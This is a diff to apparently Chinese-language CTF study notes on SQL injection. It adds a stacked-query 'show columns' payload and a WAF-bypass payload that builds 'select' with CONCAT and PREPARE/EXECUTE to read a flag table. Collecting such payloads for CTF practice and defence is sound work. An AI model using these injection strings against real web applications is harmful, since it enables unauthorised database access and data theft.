@@ -205,6 +205,10 @@ sqlmap盲注默认采用的是二分查找法
 1;show tables()#
 ```
 
+```
+show columns from `table;–+
+```
+
 
 
 # Waf绕过
@@ -235,3 +239,10 @@ select -- selec\x74
 ## 双重url编码绕过
 
 or ---  %25%36%66%25%37%32
+
+## 正则匹配select
+
+```
+set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
+```
+
